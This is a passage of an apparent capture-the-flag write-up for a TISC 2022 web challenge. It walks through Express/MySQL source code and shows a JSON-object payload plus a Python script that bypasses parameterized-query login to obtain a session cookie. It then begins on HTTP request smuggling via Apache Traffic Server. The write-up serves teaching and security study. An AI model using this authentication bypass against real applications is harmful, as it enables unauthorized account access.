</span></span></span><span class=line><span class=cl><span class=err></span>    environment:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>MYSQL_PASSWORD</span><span class=o>=</span>REDACTED                   <span class=c1># NOT THE REAL PASSWORD</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>ADMIN_TOKEN</span><span class=o>=</span>TISC<span class=o>{</span>0:1:2:3:4:5:6:6:8:9<span class=o>}</span>     <span class=c1># NOT THE REAL FLAG</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>EMAIL</span><span class=o>=</span>REDACTED@REDACTED                   <span class=c1># NOT THE REAL EMAIL</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>PASSWORD</span><span class=o>=</span>REDACTED                         <span class=c1># NOT THE REAL PASSWORD</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>BASE_URL</span><span class=o>=</span>http://localhost:8000<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  proxy:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    build: ./proxy<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    restart: always<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    ports:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - 80:8080<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  db:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    image: mysql<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    restart: always<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    environment:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>MYSQL_ROOT_PASSWORD</span><span class=o>=</span>REDACTED              <span class=c1># NOT THE REAL PASSWORD</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - <span class=nv>MYSQL_DATABASE</span><span class=o>=</span>palindrome<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    volumes:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>      - ./mysql-init:/docker-entrypoint-initdb.d<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    <span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>  redis:<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    image: redis<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span>    restart: always<span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>Right of the bat I noticed 3 key pieces of information:</p><ul><li>There is a <code>mysql</code> database that&rsquo;s exposed as the <code>db</code> service</li><li>Only the <code>proxy</code> service is exposed publicly</li><li>The flag is stored in an environment variable in the <code>app</code> service as <code>ADMIN_TOKEN</code></li></ul><p>Playing around with the web application, I realised that there was no way I could navigate to any other resources and I always got redirected to the login service. This is where I started to suspect an SQL Injection as the first step to this challenge.</p><p>The <code>db</code> service had nothing interesting so I started of by studying the application&rsquo;s <code>main.js</code> source code and its routes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>mysql</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;mysql&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>session</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s1>&#39;express-session&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//** Omitted **//
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>db</span> <span class=o>=</span> <span class=nx>mysql</span><span class=p>.</span><span class=nx>createConnection</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>host</span>     <span class=o>:</span> <span class=s1>&#39;db&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>user</span>     <span class=o>:</span> <span class=s1>&#39;web&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>password</span> <span class=o>:</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>MYSQL_PASSWORD</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>database</span> <span class=o>:</span> <span class=s1>&#39;palindrome&#39;</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>//** Omitted **//
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>port</span> <span class=o>=</span> <span class=mi>8000</span>
</span></span></code></pre></td></tr></table></div></div><p>So, we have an <code>express</code> application running on port 8000 that uses <code>mysql</code> as the backend database (as we saw earlier from the <code>docker-compose.yml</code> file).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=c1>// Application Routes
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>app</span><span class=p>.</span><span class=nx>get</span>     <span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=nx>getLoginHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span>    <span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>,</span> <span class=nx>postLoginHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span>     <span class=p>(</span><span class=s1>&#39;/index&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>indexHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span>     <span class=p>(</span><span class=s1>&#39;/token&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>getTokenHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span>    <span class=p>(</span><span class=s1>&#39;/token&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>postTokenHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span>     <span class=p>(</span><span class=s1>&#39;/verify&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>tokenVerifyHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span>     <span class=p>(</span><span class=s1>&#39;/report-issue&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>reportIssueHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>post</span>    <span class=p>(</span><span class=s1>&#39;/do-report&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>doReportHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>all</span>     <span class=p>(</span><span class=s1>&#39;/forbidden&#39;</span><span class=p>,</span> <span class=nx>authenticationMiddleware</span><span class=p>,</span> <span class=nx>forbiddenHandler</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>More importantly, based on the above routing information, our theories are confirmed, that no matter which endpoint is passed in, the <code>authenticationMiddleware</code> would always be processed first. So let&rsquo;s take a look at what <code>authenticationMiddleware</code> does:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>authenticationMiddleware</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>ip</span> <span class=o>===</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>token</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>ADMIN_TOKEN</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> 
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Ahhh, it seems like we have 2 very key pieces of information here:</p><ul><li>If <code>req.session.userId</code> is not set, the application redirects the user to the <code>/login</code> endpoint.</li><li>If the <code>req.ip</code> is <code>127.0.0.1</code>, the <code>req.session.token</code> is set to the <code>ADMIN_TOKEN</code>, which as we saw earlier, is the flag.</li></ul><p>Let&rsquo;s ignore the second part for now and focus on how to set a <code>req.session.userId</code>. If we did a search on the <code>main.js</code>, we would realise that the only other place <code>req.session.userId</code> is mentioned is in the <code>postLoginHandler</code>, so lets take a look at that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>postLoginHandler</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=p>{</span> <span class=nx>email</span><span class=p>,</span> <span class=nx>password</span> <span class=p>}</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>email</span> <span class=o>||</span> <span class=o>!</span><span class=nx>password</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>400</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Missing email or password&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>rows</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>query</span><span class=p>(</span><span class=sb>`SELECT * FROM users WHERE email = ? AND password = ?`</span><span class=p>,</span> <span class=p>[</span><span class=nx>email</span><span class=p>,</span> <span class=nx>password</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>rows</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Invalid email or password&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span> <span class=o>=</span> <span class=nx>rows</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>id</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>200</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;Success&#34;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=sql-injection-through-query-parameterization>SQL Injection through Query Parameterization<a hidden class=anchor aria-hidden=true href=#sql-injection-through-query-parameterization>#</a></h2><p>Hmmm, based on the previous section it seems like we have <a href=https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html>Query Parameterization</a>, which should TECHNICALLY protect us from SQLi, or does it?</p><p>I did a bit of digging around and eventually came across <a href=https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>an article</a> that was referenced from <a href=https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/>this article</a>, which describes the exact scenario we are facing, an <code>express</code> application that does parameterized queries.</p><p>In short, the article describes that &ldquo;due to certain specifications in <code>express</code>, one can pass in to the parameters a different value type like an <code>Object</code>, <code>Boolean</code> or an <code>Array</code>&rdquo;.</p><p>To elaborate further, this means that we can pass in an <code>Object</code> like a JSON object instead of the expected <code>String</code> into the <code>username</code> or <code>password</code> field. In other words, instead of:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>:<span class=s2>&#34;email@email.com&#34;</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>:<span class=s2>&#34;password&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>}
</span></span></span></code></pre></td></tr></table></div></div><p>We can instead pass in a javascript object to of the fields and <code>express</code> would interpret it as a valid SQL statement.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;email&#34;</span>:<span class=o>{</span><span class=s2>&#34;email&#34;</span>:1<span class=o>}</span>,
</span></span><span class=line><span class=cl>    <span class=s2>&#34;password&#34;</span>:<span class=o>{</span><span class=s2>&#34;password&#34;</span>:1<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=o>}</span>
</span></span></code></pre></td></tr></table></div></div><p>On <code>mysql</code>&rsquo;s side, the SQL statement would be interpreted like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>email</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>`</span><span class=n>email</span><span class=o>`</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>`</span><span class=n>password</span><span class=o>`</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>and because <code>email = `email`</code> and <code>password = `password`</code> both evaluates to <code>1</code>, which evaluates to the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>AND</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>and finally, <code>mysql</code> evaluates the following:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Notice that in the <code>postLoginHandler</code> code a <code>401</code> is returned only if the number of rows returned by <code>mysql</code> is 0:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>rows</span><span class=p>.</span><span class=nx>length</span> <span class=o>===</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Invalid email or password&#39;</span> <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span> <span class=o>=</span> <span class=nx>rows</span><span class=p>[</span><span class=mi>0</span><span class=p>].</span><span class=nx>id</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>200</span><span class=p>).</span><span class=nx>send</span><span class=p>({</span> <span class=nx>message</span><span class=o>:</span> <span class=s2>&#34;Success&#34;</span> <span class=p>})</span>
</span></span></code></pre></td></tr></table></div></div><p>Thankfully enough, there is only one user that is registered in the database as seen in in <code>mysql-init/init.sql</code> file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>INSERT</span><span class=w> </span><span class=k>INTO</span><span class=w> </span><span class=o>`</span><span class=n>users</span><span class=o>`</span><span class=w> </span><span class=p>(</span><span class=o>`</span><span class=n>email</span><span class=o>`</span><span class=p>,</span><span class=w> </span><span class=o>`</span><span class=n>password</span><span class=o>`</span><span class=p>)</span><span class=w> </span><span class=k>VALUES</span><span class=w> </span><span class=p>(</span><span class=s2>&#34;REDACTED@REDACTED&#34;</span><span class=p>,</span><span class=w> </span><span class=s2>&#34;REDACTED&#34;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s a script that I used to authenticate and print a cookie that can be used for the other parts of this challenge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627&#34;</span>
</span></span><span class=line><span class=cl><span class=n>body</span> <span class=o>=</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;email&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;password&#34;</span><span class=p>:</span> <span class=p>{</span><span class=s2>&#34;password&#34;</span><span class=p>:</span><span class=mi>1</span><span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>login_url</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>url</span><span class=si>}</span><span class=s2>/login&#34;</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>login_url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>cookies</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>c</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;connect.sid&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>name</span><span class=p>,</span> <span class=n>c</span><span class=o>.</span><span class=n>value</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I ran the script to get a cookie:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ python3 login.py
</span></span><span class=line><span class=cl>connect.sid s%3AZtg1Ilaj_1kRPexPD2nopZUCN0SF_GIF.ESM4lx5LkmWvf57fvccsa%2Bh8ADOVPGLGZO1Sh4YMidg
</span></span></code></pre></td></tr></table></div></div><p>I put it in the browser and success, I have bypassed the authentication system and can successfully navigate to other parts of the web application!</p><p><img loading=lazy src=/images/posts/tisc-2022-level5-login-bypass.PNG alt=Login-Bypass></p><h2 id=http-request-smuggling>HTTP Request Smuggling<a hidden class=anchor aria-hidden=true href=#http-request-smuggling>#</a></h2><p>Let&rsquo;s go back and take a look at our <code>authenticationMiddleware</code> again:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kr>const</span> <span class=nx>authenticationMiddleware</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>userId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>ip</span> <span class=o>===</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>req</span><span class=p>.</span><span class=nx>session</span><span class=p>.</span><span class=nx>token</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>ADMIN_TOKEN</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>next</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> 
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s1>&#39;/login&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>It seems like in order to set the <code>req.session.token</code> as the FLAG, we would have to make a request from <code>127.0.0.1</code>. The first thing that stood out to me was the <code>POST /do-report</code> endpoint, which when you attempt to make a request to it externally, it returns a <code>403 forbidden</code>.</p><p>I guess it&rsquo;s time to take a deeper look at the <code>proxy</code> service itself! Let&rsquo;s first inspect the proxy software being used from the <code>Dockerfile</code> itself:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-docker data-lang=docker><span class=line><span class=cl><span class=k>FROM</span><span class=s> ubuntu:20.04</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apt-get update <span class=o>&amp;&amp;</span> <span class=nv>DEBIAN_FRONTEND</span><span class=o>=</span>noninteractive apt-get upgrade -y<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> <span class=nv>DEBIAN_FRONTEND</span><span class=o>=</span>noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /ats</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.tar.bz2 &gt; ats.tar.bz2 <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    tar xf ats.tar.bz2 <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    <span class=nb>cd</span> trafficserver-9.1.0 <span class=o>&amp;&amp;</span> <span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>    ./configure --prefix<span class=o>=</span>/opt/ts <span class=o>&amp;&amp;</span> <span class=se>\
